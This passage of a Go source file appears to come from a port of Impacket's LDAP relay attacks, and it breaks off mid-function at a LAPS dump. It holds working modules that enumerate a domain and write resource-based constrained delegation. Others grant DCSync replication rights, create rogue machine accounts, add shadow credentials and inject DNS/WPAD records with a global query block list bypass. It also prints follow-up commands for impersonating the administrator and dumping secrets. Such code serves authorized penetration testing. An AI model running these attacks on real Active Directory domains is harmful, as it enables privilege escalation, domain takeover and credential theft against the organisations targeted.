// SPDX-License-Identifier: Apache-2.0

package relay

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	goldap "github.com/go-ldap/ldap/v3"

	"gopacket/internal/build"
	gopacketldap "gopacket/pkg/ldap"
	"gopacket/pkg/security"
)

// Package-level tracking to match Impacket's global state
var (
	// delegatePerformed tracks which computers have had RBCD set to avoid duplicates
	delegatePerformed   = make(map[string]bool)
	delegatePerformedMu sync.Mutex

	// alreadyAddedComputer prevents creating multiple machine accounts in one session
	alreadyAddedComputer   bool
	alreadyAddedComputerMu sync.Mutex
)

// --- Attack Module Registrations ---

// LDAPDumpAttack enumerates domain objects via LDAP.
type LDAPDumpAttack struct{}

func (a *LDAPDumpAttack) Name() string { return "ldapdump" }
func (a *LDAPDumpAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*gopacketldap.Client)
	if !ok {
		return fmt.Errorf("ldapdump attack requires LDAP session")
	}
	return ldapDumpAttack(client, config)
}

// DelegateAttack performs RBCD delegation via LDAP.
type DelegateAttack struct{}

func (a *DelegateAttack) Name() string { return "delegate" }
func (a *DelegateAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*gopacketldap.Client)
	if !ok {
		return fmt.Errorf("delegate attack requires LDAP session")
	}
	return delegateAttack(client, config)
}

// ACLAbuseAttack grants DCSync rights via LDAP.
type ACLAbuseAttack struct{}

func (a *ACLAbuseAttack) Name() string { return "aclabuse" }
func (a *ACLAbuseAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*gopacketldap.Client)
	if !ok {
		return fmt.Errorf("aclabuse attack requires LDAP session")
	}
	return aclAbuseAttack(client, config)
}

// AddComputerAttack creates a machine account via LDAP.
type AddComputerAttack struct{}

func (a *AddComputerAttack) Name() string { return "addcomputer" }
func (a *AddComputerAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*gopacketldap.Client)
	if !ok {
		return fmt.Errorf("addcomputer attack requires LDAP session")
	}
	return addComputerAttack(client, config)
}

// ShadowCredsAttack writes msDS-KeyCredentialLink via LDAP.
type ShadowCredsAttack struct{}

func (a *ShadowCredsAttack) Name() string { return "shadowcreds" }
func (a *ShadowCredsAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*gopacketldap.Client)
	if !ok {
		return fmt.Errorf("shadowcreds attack requires LDAP session")
	}
	return shadowCredsAttack(client, config)
}

// LAPSDumpAttack reads LAPS passwords via LDAP.
type LAPSDumpAttack struct{}

func (a *LAPSDumpAttack) Name() string { return "laps" }
func (a *LAPSDumpAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*gopacketldap.Client)
	if !ok {
		return fmt.Errorf("laps attack requires LDAP session")
	}
	return dumpLAPSAttack(client, config)
}

// GMSADumpAttack reads gMSA passwords via LDAP.
type GMSADumpAttack struct{}

func (a *GMSADumpAttack) Name() string { return "gmsa" }
func (a *GMSADumpAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*gopacketldap.Client)
	if !ok {
		return fmt.Errorf("gmsa attack requires LDAP session")
	}
	return dumpGMSAAttack(client, config)
}

// --- Helper Functions ---

// extractDomainFromDN converts "DC=corp,DC=local" to "corp.local"
func extractDomainFromDN(baseDN string) string {
	var parts []string
	for _, part := range strings.Split(baseDN, ",") {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(strings.ToUpper(part), "DC=") {
			parts = append(parts, part[3:])
		}
	}
	return strings.Join(parts, ".")
}

// --- Domain Dump Attack ---

func ldapDumpAttack(client *gopacketldap.Client, config *Config) error {
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		return err
	}
	domain := extractDomainFromDN(baseDN)

	log.Printf("[*] Domain dump on %s (%s)", domain, baseDN)

	// Users
	log.Printf("[*] Enumerating domain users...")
	userResult, err := client.Search(baseDN,
		"(&(objectCategory=person)(objectClass=user))",
		[]string{"sAMAccountName", "distinguishedName", "memberOf", "userAccountControl",
			"lastLogon", "pwdLastSet", "description", "adminCount"})
	if err != nil {
		log.Printf("[-] User enumeration failed: %v", err)
	} else {
		log.Printf("[+] Found %d users:", len(userResult.Entries))
		for _, entry := range userResult.Entries {
			sam := entry.GetAttributeValue("sAMAccountName")
			uac := entry.GetAttributeValue("userAccountControl")
			desc := entry.GetAttributeValue("description")
			adminCount := entry.GetAttributeValue("adminCount")
			status := ""
			if uacVal, _ := strconv.Atoi(uac); uacVal&0x2 != 0 {
				status = " [DISABLED]"
			}
			admin := ""
			if adminCount == "1" {
				admin = " [ADMIN]"
			}
			extra := ""
			if desc != "" {
				extra = fmt.Sprintf(" (%s)", desc)
			}
			log.Printf("    %-30s%s%s%s", sam, status, admin, extra)
		}
	}

	// Computers
	log.Printf("[*] Enumerating domain computers...")
	compResult, err := client.Search(baseDN,
		"(objectCategory=computer)",
		[]string{"sAMAccountName", "dNSHostName", "operatingSystem", "operatingSystemVersion"})
	if err != nil {
		log.Printf("[-] Computer enumeration failed: %v", err)
	} else {
		log.Printf("[+] Found %d computers:", len(compResult.Entries))
		for _, entry := range compResult.Entries {
			sam := entry.GetAttributeValue("sAMAccountName")
			dns := entry.GetAttributeValue("dNSHostName")
			osName := entry.GetAttributeValue("operatingSystem")
			log.Printf("    %-30s %-40s %s", sam, dns, osName)
		}
	}

	// Groups
	log.Printf("[*] Enumerating domain groups...")
	groupResult, err := client.Search(baseDN,
		"(objectCategory=group)",
		[]string{"sAMAccountName", "distinguishedName", "member", "adminCount"})
	if err != nil {
		log.Printf("[-] Group enumeration failed: %v", err)
	} else {
		log.Printf("[+] Found %d groups:", len(groupResult.Entries))
		for _, entry := range groupResult.Entries {
			sam := entry.GetAttributeValue("sAMAccountName")
			members := entry.GetAttributeValues("member")
			adminCount := entry.GetAttributeValue("adminCount")
			admin := ""
			if adminCount == "1" {
				admin = " [PRIVILEGED]"
			}
			log.Printf("    %-40s (%d members)%s", sam, len(members), admin)
		}
	}

	// Trusts
	log.Printf("[*] Enumerating domain trusts...")
	trustResult, err := client.Search(baseDN,
		"(objectClass=trustedDomain)",
		[]string{"name", "trustDirection", "trustType", "trustAttributes"})
	if err != nil {
		log.Printf("[-] Trust enumeration failed: %v", err)
	} else {
		if len(trustResult.Entries) > 0 {
			log.Printf("[+] Found %d trusts:", len(trustResult.Entries))
			for _, entry := range trustResult.Entries {
				name := entry.GetAttributeValue("name")
				dir := entry.GetAttributeValue("trustDirection")
				log.Printf("    %-40s direction=%s", name, dir)
			}
		} else {
			log.Printf("[*] No domain trusts found")
		}
	}

	// GPOs
	log.Printf("[*] Enumerating GPOs...")
	gpoResult, err := client.Search(baseDN,
		"(objectClass=groupPolicyContainer)",
		[]string{"displayName", "gPCFileSysPath", "distinguishedName"})
	if err != nil {
		log.Printf("[-] GPO enumeration failed: %v", err)
	} else if len(gpoResult.Entries) > 0 {
		log.Printf("[+] Found %d GPOs:", len(gpoResult.Entries))
		for _, entry := range gpoResult.Entries {
			name := entry.GetAttributeValue("displayName")
			path := entry.GetAttributeValue("gPCFileSysPath")
			log.Printf("    %-40s %s", name, path)
		}
	}

	// Save results to loot directory
	if config.LootDir != "" && userResult != nil {
		lootFile := filepath.Join(config.LootDir, fmt.Sprintf("%s_ldap_dump.txt", domain))
		f, err := os.Create(lootFile)
		if err == nil {
			defer f.Close()
			fmt.Fprintf(f, "LDAP Domain Dump - %s\n", domain)
			fmt.Fprintf(f, "Base DN: %s\n", baseDN)
			fmt.Fprintf(f, "Time: %s\n\n", time.Now().Format(time.RFC3339))

			fmt.Fprintf(f, "=== Users (%d) ===\n", len(userResult.Entries))
			for _, entry := range userResult.Entries {
				fmt.Fprintf(f, "%s\t%s\n", entry.GetAttributeValue("sAMAccountName"), entry.DN)
			}

			if compResult != nil {
				fmt.Fprintf(f, "\n=== Computers (%d) ===\n", len(compResult.Entries))
				for _, entry := range compResult.Entries {
					fmt.Fprintf(f, "%s\t%s\t%s\n",
						entry.GetAttributeValue("sAMAccountName"),
						entry.GetAttributeValue("dNSHostName"),
						entry.GetAttributeValue("operatingSystem"))
				}
			}

			if groupResult != nil {
				fmt.Fprintf(f, "\n=== Groups (%d) ===\n", len(groupResult.Entries))
				for _, entry := range groupResult.Entries {
					fmt.Fprintf(f, "%s\t(%d members)\n",
						entry.GetAttributeValue("sAMAccountName"),
						len(entry.GetAttributeValues("member")))
				}
			}

			log.Printf("[+] Results saved to %s", lootFile)
		}
	}

	return nil
}

// --- RBCD Delegation Attack ---
// Matches Impacket's delegateAttack() flow:
// 1. If --escalate-user not provided, auto-create a machine account via addComputer
// 2. Resolve the escalate user's SID
// 3. Read/create SecurityDescriptor on target computer
// 4. Add ACE granting delegation rights
// 5. Write modified SD back

func delegateAttack(client *gopacketldap.Client, config *Config) error {
	targetSAM := config.delegateTarget
	if targetSAM == "" {
		return fmt.Errorf("no delegation target identified (need relayed computer account)")
	}

	// Check if already performed for this target (matches Impacket's delegatePerformed global)
	delegatePerformedMu.Lock()
	if delegatePerformed[targetSAM] {
		delegatePerformedMu.Unlock()
		log.Printf("[*] Delegate attack already performed for this computer, skipping")
		return nil
	}
	delegatePerformedMu.Unlock()

	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		return err
	}
	domain := extractDomainFromDN(baseDN)

	escalateUser := config.EscalateUser
	if escalateUser == "" {
		// Auto-create a machine account (matches Impacket's --delegate-access behavior)
		computerName, _, err := addComputerAccount(client, config)
		if err != nil {
			return err
		}
		escalateUser = computerName
		config.EscalateUser = escalateUser
	}

	log.Printf("[*] RBCD Delegation Attack")
	log.Printf("[*] Escalate user: %s", escalateUser)

	// 1. Resolve the escalate user's SID
	escalateResult, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(escalateUser)),
		[]string{"objectSid", "sAMAccountName"})
	if err != nil || len(escalateResult.Entries) == 0 {
		log.Printf("[-] User to escalate does not exist!")
		return fmt.Errorf("failed to find escalate user %s: %v", escalateUser, err)
	}

	escalateSIDBytes := escalateResult.Entries[0].GetRawAttributeValue("objectSid")
	escalateSID, _, err := security.ParseSIDBytes(escalateSIDBytes)
	if err != nil {
		return fmt.Errorf("failed to parse escalate user SID: %v", err)
	}

	log.Printf("[*] Escalate user SID: %s", escalateSID.String())

	// 2. Find the target computer (the relayed account)
	targetResult, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(targetSAM)),
		[]string{"objectSid", "msDS-AllowedToActOnBehalfOfOtherIdentity", "distinguishedName"})
	if err != nil || len(targetResult.Entries) == 0 {
		log.Printf("[-] Computer to modify does not exist! (wrong domain?)")
		return fmt.Errorf("failed to find target %s: %v", targetSAM, err)
	}

	targetDN := targetResult.Entries[0].DN

	// 3. Build or modify SecurityDescriptor for RBCD
	existing := targetResult.Entries[0].GetRawAttributeValue("msDS-AllowedToActOnBehalfOfOtherIdentity")

	var sd *security.SecurityDescriptor
	if len(existing) > 0 {
		sd, err = security.ParseSecurityDescriptor(existing)
		if err != nil {
			log.Printf("[-] Warning: failed to parse existing SD, creating new: %v", err)
			sd = nil
		}
		if sd != nil && build.Debug {
			log.Printf("[D] Currently allowed sids:")
			if sd.DACL != nil {
				for _, ace := range sd.DACL.ACEs {
					log.Printf("[D]     %s", ace.SID.String())
				}
			}
		}
	}

	if sd == nil {
		ownerSID, _ := security.ParseSID("S-1-5-32-544") // BUILTIN\Administrators
		sd = &security.SecurityDescriptor{
			Revision: 1,
			Control:  security.SE_DACL_PRESENT | security.SE_SELF_RELATIVE,
			Owner:    ownerSID,
			Group:    ownerSID,
			DACL: &security.ACL{
				AclRevision: 4,
			},
		}
	}

	// 4. Add ACE granting full control to escalate user
	ace := &security.ACE{
		Type:  security.ACCESS_ALLOWED_ACE_TYPE,
		Flags: 0,
		Mask:  security.FULL_CONTROL,
		SID:   escalateSID,
	}
	sd.DACL.AddACE(ace)

	sdBytes := sd.Marshal()

	// 5. Write back via LDAP Modify
	modReq := goldap.NewModifyRequest(targetDN, nil)
	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(sdBytes)})

	if err := client.Conn.Modify(modReq); err != nil {
		if strings.Contains(err.Error(), "Insufficient") || strings.Contains(err.Error(), "insufficient") {
			return fmt.Errorf("could not modify object, the server reports insufficient rights: %v", err)
		}
		return fmt.Errorf("failed to write RBCD delegation: %v", err)
	}

	// Track successful delegation
	delegatePerformedMu.Lock()
	delegatePerformed[targetSAM] = true
	delegatePerformedMu.Unlock()

	log.Printf("[+] Delegation rights modified succesfully!")
	log.Printf("[+] %s can now impersonate users on %s via S4U2Proxy", escalateUser, targetSAM)
	log.Printf("[+] Next steps:")
	log.Printf("    getST -spn cifs/%s -impersonate administrator %s/%s",
		strings.TrimSuffix(targetSAM, "$"), domain, escalateUser)

	return nil
}

// --- ACL Abuse (DCSync Rights) Attack ---

func aclAbuseAttack(client *gopacketldap.Client, config *Config) error {
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		return err
	}
	domain := extractDomainFromDN(baseDN)

	escalateUser := config.EscalateUser
	if escalateUser == "" {
		return fmt.Errorf("--escalate-user is required for aclabuse attack")
	}

	log.Printf("[*] ACL Abuse Attack - Granting DCSync rights to %s", escalateUser)

	// 1. Get user SID
	userResult, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(escalateUser)),
		[]string{"objectSid"})
	if err != nil || len(userResult.Entries) == 0 {
		return fmt.Errorf("failed to find user %s: %v", escalateUser, err)
	}

	userSIDBytes := userResult.Entries[0].GetRawAttributeValue("objectSid")
	userSID, _, err := security.ParseSIDBytes(userSIDBytes)
	if err != nil {
		return fmt.Errorf("failed to parse user SID: %v", err)
	}

	log.Printf("[*] User SID: %s", userSID.String())

	// 2. Read domain object's nTSecurityDescriptor with SD Flags control
	sdControl := gopacketldap.NewControlMicrosoftSDFlags(0x04) // DACL_SECURITY_INFORMATION
	domainResult, err := client.SearchWithControls(baseDN,
		"(&(objectCategory=domain))",
		[]string{"nTSecurityDescriptor", "distinguishedName"},
		[]goldap.Control{sdControl})
	if err != nil || len(domainResult.Entries) == 0 {
		return fmt.Errorf("failed to read domain SD: %v", err)
	}

	domainDN := domainResult.Entries[0].DN
	sdData := domainResult.Entries[0].GetRawAttributeValue("nTSecurityDescriptor")

	if len(sdData) == 0 {
		return fmt.Errorf("failed to read nTSecurityDescriptor (may need higher privileges)")
	}

	// 3. Parse existing SecurityDescriptor
	sd, err := security.ParseSecurityDescriptor(sdData)
	if err != nil {
		return fmt.Errorf("failed to parse domain SD: %v", err)
	}

	// 4. Save original SD for restore
	if config.LootDir != "" {
		restoreFile := filepath.Join(config.LootDir, fmt.Sprintf("%s_acl_backup.bin", domain))
		os.WriteFile(restoreFile, sdData, 0600)
		log.Printf("[*] Original SD saved to %s", restoreFile)
	}

	// 5. Add two object-specific ACEs for DCSync
	// DS-Replication-Get-Changes: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
	replicationChanges, _ := security.ParseGUID("1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")
	ace1 := &security.ACE{
		Type:        security.ACCESS_ALLOWED_OBJECT_ACE_TYPE,
		Flags:       0,
		Mask:        security.DS_CONTROL_ACCESS,
		ObjectFlags: 0x01, // ACE_OBJECT_TYPE_PRESENT
		ObjectType:  replicationChanges,
		SID:         userSID,
	}

	// DS-Replication-Get-Changes-All: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
	replicationChangesAll, _ := security.ParseGUID("1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
	ace2 := &security.ACE{
		Type:        security.ACCESS_ALLOWED_OBJECT_ACE_TYPE,
		Flags:       0,
		Mask:        security.DS_CONTROL_ACCESS,
		ObjectFlags: 0x01, // ACE_OBJECT_TYPE_PRESENT
		ObjectType:  replicationChangesAll,
		SID:         userSID,
	}

	sd.DACL.AddACE(ace1)
	sd.DACL.AddACE(ace2)

	// 6. Write modified SD back
	newSDData := sd.Marshal()
	sdControlWrite := gopacketldap.NewControlMicrosoftSDFlags(0x04)
	modReq := goldap.NewModifyRequest(domainDN, []goldap.Control{sdControlWrite})
	modReq.Replace("nTSecurityDescriptor", []string{string(newSDData)})

	if err := client.Conn.Modify(modReq); err != nil {
		return fmt.Errorf("failed to write modified SD: %v", err)
	}

	log.Printf("[+] DCSync rights granted to %s on %s!", escalateUser, domain)
	log.Printf("[+] Next steps:")
	log.Printf("    secretsdump %s/%s@%s", domain, escalateUser, config.TargetAddr)

	return nil
}

// --- Add Computer Attack ---

// addComputerAccount creates a new machine account via LDAP and returns (computerName, password, error).
// Shared helper used by both the standalone addcomputer attack and the delegate attack's
// auto-creation flow (matching Impacket's --delegate-access behavior).
func addComputerAccount(client *gopacketldap.Client, config *Config) (string, string, error) {
	alreadyAddedComputerMu.Lock()
	if alreadyAddedComputer {
		alreadyAddedComputerMu.Unlock()
		return "", "", fmt.Errorf("new computer already added. Refusing to add another")
	}
	alreadyAddedComputerMu.Unlock()

	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		return "", "", err
	}
	domain := extractDomainFromDN(baseDN)

	// Generate computer name (Impacket: 8 random uppercase ASCII letters + $)
	computerName := config.AddComputer
	if computerName == "" {
		randBytes := make([]byte, 8)
		rand.Read(randBytes)
		var name strings.Builder
		for _, b := range randBytes {
			name.WriteByte('A' + (b % 26))
		}
		computerName = name.String() + "$"
	}
	if !strings.HasSuffix(computerName, "$") {
		computerName += "$"
	}
	computerName = strings.ToUpper(computerName)

	password := generateRandomPassword(15)
	hostname := strings.TrimSuffix(computerName, "$")

	log.Printf("[*] Attempting to create computer in: CN=Computers,%s", baseDN)

	// Build SPN list (matches Impacket exactly)
	spns := []string{
		"HOST/" + hostname,
		"HOST/" + hostname + "." + domain,
		"RestrictedKrbHost/" + hostname,
		"RestrictedKrbHost/" + hostname + "." + domain,
	}

	// Create computer in default Computers container
	dn := "CN=" + hostname + ",CN=Computers," + baseDN

	attrs := map[string][]string{
		"objectClass":          {"top", "person", "organizationalPerson", "user", "computer"},
		"sAMAccountName":       {computerName},
		"userAccountControl":   {"4096"}, // WORKSTATION_TRUST_ACCOUNT
		"dNSHostName":          {hostname + "." + domain},
		"servicePrincipalName": spns,
	}

	// unicodePwd must be UTF-16LE encoded with surrounding quotes
	passwordEncoded := encodeUnicodePassword(password)

	// Use goldap.Add directly for binary attribute support
	addReq := goldap.NewAddRequest(dn, nil)
	for name, vals := range attrs {
		addReq.Attribute(name, vals)
	}
	addReq.Attribute("unicodePwd", []string{string(passwordEncoded)})

	if err := client.Conn.Add(addReq); err != nil {
		errStr := err.Error()
		// Match Impacket's error message for non-TLS connections
		if strings.Contains(errStr, "Unwilling") || strings.Contains(errStr, "unwilling") {
			return "", "", fmt.Errorf("failed to add a new computer. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing account")
		}
		return "", "", fmt.Errorf("failed to add a new computer: %v", err)
	}

	alreadyAddedComputerMu.Lock()
	alreadyAddedComputer = true
	alreadyAddedComputerMu.Unlock()

	log.Printf("[+] Adding new computer with username: %s and password: %s result: OK", computerName, password)
	return computerName, password, nil
}

func addComputerAttack(client *gopacketldap.Client, config *Config) error {
	computerName, password, err := addComputerAccount(client, config)
	if err != nil {
		return err
	}

	baseDN, _ := client.GetDefaultNamingContext()
	domain := extractDomainFromDN(baseDN)

	log.Printf("[+] Computer %s added successfully!", computerName)
	log.Printf("[+] Password: %s", password)
	log.Printf("[+] Domain: %s", domain)
	log.Printf("[+] Use for RBCD delegation or other attacks")

	return nil
}

// --- Shadow Credentials Attack ---

func shadowCredsAttack(client *gopacketldap.Client, config *Config) error {
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		return err
	}

	target := config.ShadowTarget
	if target == "" {
		// Default to the relayed computer account (matches Impacket)
		target = config.delegateTarget
	}
	if target == "" {
		return fmt.Errorf("--shadow-target is required for shadowcreds attack")
	}

	log.Printf("[*] Shadow Credentials Attack on %s", target)

	// 1. Find target's DN and current msDS-KeyCredentialLink
	targetResult, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(target)),
		[]string{"sAMAccountName", "objectSid", "msDS-KeyCredentialLink", "distinguishedName"})
	if err != nil || len(targetResult.Entries) == 0 {
		return fmt.Errorf("failed to find target %s: %v", target, err)
	}

	targetDN := targetResult.Entries[0].DN
	existingLinks := targetResult.Entries[0].GetAttributeValues("msDS-KeyCredentialLink")

	log.Printf("[*] Target DN: %s", targetDN)
	log.Printf("[*] Existing KeyCredentialLink entries: %d", len(existingLinks))

	// 2. Generate self-signed certificate (RSA-2048)
	cert, key, err := generateSelfSignedCert(target)
	if err != nil {
		return fmt.Errorf("failed to generate certificate: %v", err)
	}

	// 3. Build KeyCredential structure
	keyCredential, deviceID, err := buildKeyCredential(cert, key)
	if err != nil {
		return fmt.Errorf("failed to build KeyCredential: %v", err)
	}

	// 4. Format as DN-With-Binary for LDAP
	targetSIDBytes := targetResult.Entries[0].GetRawAttributeValue("objectSid")
	dnWithBinary := formatDNWithBinary(keyCredential, targetDN)

	// 5. Append to existing values
	newLinks := append(existingLinks, dnWithBinary)

	modReq := goldap.NewModifyRequest(targetDN, nil)
	modReq.Replace("msDS-KeyCredentialLink", newLinks)

	if err := client.Conn.Modify(modReq); err != nil {
		return fmt.Errorf("failed to write msDS-KeyCredentialLink: %v", err)
	}

	// 6. Export certificate with random password (matches Impacket)
	domain := extractDomainFromDN(baseDN)
	pfxPassword := generateRandomAlphanumeric(20)
	pfxFile := filepath.Join(config.LootDir, fmt.Sprintf("%s_%s.pfx", target, hex.EncodeToString(deviceID[:4])))
	if err := exportPFX(cert, key, pfxFile, pfxPassword); err != nil {
		log.Printf("[-] Failed to export PFX: %v", err)
	} else {
		log.Printf("[+] Saved PFX (#PKCS12) certificate & key at path: %s", pfxFile)
		log.Printf("[+] Must be used with password: %s", pfxPassword)
	}

	log.Printf("[+] Shadow Credentials attack succeeded!")
	log.Printf("[+] DeviceID: %s", hex.EncodeToString(deviceID))
	_ = targetSIDBytes
	log.Printf("[+] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
	log.Printf("[+] Run the following command to obtain a TGT")
	log.Printf("    python3 PKINITtools/gettgtpkinit.py -cert-pfx %s -pfx-pass %s %s/%s %s.ccache",
		pfxFile, pfxPassword, domain, target, target)

	return nil
}

// --- DNS Record Attack ---

// DNSRecordAttack adds a DNS record via LDAP.
type DNSRecordAttack struct{}

func (a *DNSRecordAttack) Name() string { return "adddns" }
func (a *DNSRecordAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*gopacketldap.Client)
	if !ok {
		return fmt.Errorf("adddns attack requires LDAP session")
	}
	return addDNSRecordAttack(client, config)
}

// addDNSRecordAttack adds an A record (and NS for wpad) via LDAP.
// Matches Impacket's ldapattack.py addDnsRecord() flow.
func addDNSRecordAttack(client *gopacketldap.Client, config *Config) error {
	recordName := config.AddDNSRecord[0]
	recordIP := config.AddDNSRecord[1]

	if recordName == "" || recordIP == "" {
		return fmt.Errorf("--add-dns-record requires NAME:IP format")
	}

	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		return err
	}
	domain := extractDomainFromDN(baseDN)

	log.Printf("[*] Adding DNS record: %s -> %s", recordName, recordIP)

	// Find DomainDnsZones naming context
	dnsNamingContext, err := findDNSNamingContext(client)
	if err != nil {
		return err
	}

	dnsBaseDN := fmt.Sprintf("DC=%s,CN=MicrosoftDNS,%s", domain, dnsNamingContext)

	// Check if record already exists
	existing, err := client.Search(dnsBaseDN,
		fmt.Sprintf("(name=%s)", goldap.EscapeFilter(recordName)),
		[]string{"name"})
	if err == nil && len(existing.Entries) > 0 {
		return fmt.Errorf("domain already has a '%s' DNS record", recordName)
	}

	log.Printf("[*] Domain does not have a '%s' record", recordName)

	isWPAD := strings.EqualFold(recordName, "wpad")
	aRecordName := recordName

	if isWPAD {
		// GQBL bypass: create random A record, then NS wpad pointing to it
		log.Printf("[*] WPAD detected - bypassing GQBL with intermediate A record")
		randBytes := make([]byte, 6)
		rand.Read(randBytes)
		aRecordName = hex.EncodeToString(randBytes)
	}

	// Build A record DNS data
	aRecordData := buildDNSRecord(recordIP, "A")
	aRecordDN := fmt.Sprintf("DC=%s,%s", aRecordName, dnsBaseDN)

	// Get schema naming context for objectCategory
	schemaDN, _ := client.GetSchemaNamingContext()
	objectCategory := fmt.Sprintf("CN=Dns-Node,%s", schemaDN)

	// ACL allowing everyone read/write (matches Impacket's hardcoded SD)
	aclAllowEveryone := []byte{
		0x01, 0x00, 0x04, 0x9c, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x14, 0x00, 0x00, 0x00, 0x02, 0x00, 0x30, 0x00,
		0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00,
		0xff, 0x01, 0x0f, 0x00, 0x01, 0x01, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x0a, 0x14, 0x00, 0x00, 0x00, 0x00, 0x10,
		0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
		0x00, 0x00, 0x00, 0x00,
	}

	addReq := goldap.NewAddRequest(aRecordDN, nil)
	addReq.Attribute("objectClass", []string{"top", "dnsNode"})
	addReq.Attribute("dnsRecord", []string{string(aRecordData)})
	addReq.Attribute("objectCategory", []string{objectCategory})
	addReq.Attribute("dNSTombstoned", []string{"FALSE"})
	addReq.Attribute("name", []string{aRecordName})
	addReq.Attribute("nTSecurityDescriptor", []string{string(aclAllowEveryone)})

	if err := client.Conn.Add(addReq); err != nil {
		return fmt.Errorf("failed to add A record '%s': %v", aRecordName, err)
	}

	log.Printf("[+] Added A record '%s' -> %s", aRecordName, recordIP)
	log.Printf("[!] CLEANUP: set dNSTombstoned=TRUE and dnsRecord=NULL on %s", aRecordDN)

	if !isWPAD {
		return nil
	}

	// Add wpad NS record pointing to the intermediate A record
	nsTarget := aRecordName + "." + domain
	nsRecordData := buildDNSRecord(nsTarget, "NS")
	nsRecordDN := fmt.Sprintf("DC=wpad,%s", dnsBaseDN)

	nsAddReq := goldap.NewAddRequest(nsRecordDN, nil)
	nsAddReq.Attribute("objectClass", []string{"top", "dnsNode"})
	nsAddReq.Attribute("dnsRecord", []string{string(nsRecordData)})
	nsAddReq.Attribute("objectCategory", []string{objectCategory})
	nsAddReq.Attribute("dNSTombstoned", []string{"FALSE"})
	nsAddReq.Attribute("name", []string{"wpad"})
	nsAddReq.Attribute("nTSecurityDescriptor", []string{string(aclAllowEveryone)})

	if err := client.Conn.Add(nsAddReq); err != nil {
		return fmt.Errorf("failed to add NS record 'wpad': %v", err)
	}

	log.Printf("[+] Added NS record 'wpad' -> %s", nsTarget)
	log.Printf("[!] CLEANUP: set dNSTombstoned=TRUE and dnsRecord=NULL on %s", nsRecordDN)

	return nil
}

// findDNSNamingContext finds the DomainDnsZones naming context.
func findDNSNamingContext(client *gopacketldap.Client) (string, error) {
	rootDSE, err := client.SearchBase("", "(objectClass=*)", []string{"namingContexts"})
	if err != nil {
		return "", fmt.Errorf("failed to query rootDSE: %v", err)
	}

	for _, entry := range rootDSE.Entries {
		for _, nc := range entry.GetAttributeValues("namingContexts") {
			if strings.Contains(strings.ToLower(nc), "domaindnszones") {
				return nc, nil
			}
		}
	}
	return "", fmt.Errorf("could not find DomainDnsZones naming context")
}

// buildDNSRecord constructs the binary DNS record format used by AD-integrated DNS.
func buildDNSRecord(data, recordType string) []byte {
	var dnsType uint16
	var dnsData []byte

	switch recordType {
	case "A":
		dnsType = 0x0001
		parts := strings.Split(data, ".")
		dnsData = make([]byte, len(parts))
		for i, p := range parts {
			v, _ := strconv.Atoi(p)
			dnsData[i] = byte(v)
		}
	case "NS":
		dnsType = 0x0002
		nameArray := encodeDNSNameArray(data)
		dnsData = make([]byte, 2+len(nameArray)+1)
		dnsData[0] = byte(len(data) + 2)
		dnsData[1] = byte(strings.Count(data, ".") + 1)
		copy(dnsData[2:], nameArray)
		dnsData[len(dnsData)-1] = 0 // null terminator
	default:
		return nil
	}

	// DNS record header (matching Impacket's format)
	record := make([]byte, 0, 24+len(dnsData))

	// DataLength (2 bytes LE)
	dnsLength := make([]byte, 2)
	binary.LittleEndian.PutUint16(dnsLength, uint16(len(dnsData)))
	record = append(record, dnsLength...)

	// Type (2 bytes LE)
	typeBytes := make([]byte, 2)
	binary.LittleEndian.PutUint16(typeBytes, dnsType)
	record = append(record, typeBytes...)

	// Version/Flags (4 bytes)
	record = append(record, 0x05, 0xF0, 0x00, 0x00)

	// Serial (4 bytes LE) - use 1 as default
	serial := make([]byte, 4)
	binary.LittleEndian.PutUint32(serial, 1)
	record = append(record, serial...)

	// TTL (4 bytes big-endian - reversed from Impacket's "reversed(int_to_4_bytes(60))")
	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 60)
	record = append(record, ttl...)

	// Reserved (8 bytes)
	record = append(record, 0, 0, 0, 0, 0, 0, 0, 0)

	// Data
	record = append(record, dnsData...)

	return record
}

// encodeDNSNameArray encodes a domain name in DNS label format (length-prefixed segments).
func encodeDNSNameArray(name string) []byte {
	var result []byte
	parts := strings.Split(name, ".")
	for _, part := range parts {
		result = append(result, byte(len(part)))
		result = append(result, []byte(part)...)
	}
	return result
}

// --- LAPS Dump Attack ---

func dumpLAPSAttack(client *gopacketldap.Client, config *Config) error {
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		return err
	}

	log.Printf("[*] Dumping LAPS passwords...")

	result, err := client.Search(baseDN,
		"(objectCategory=computer)",
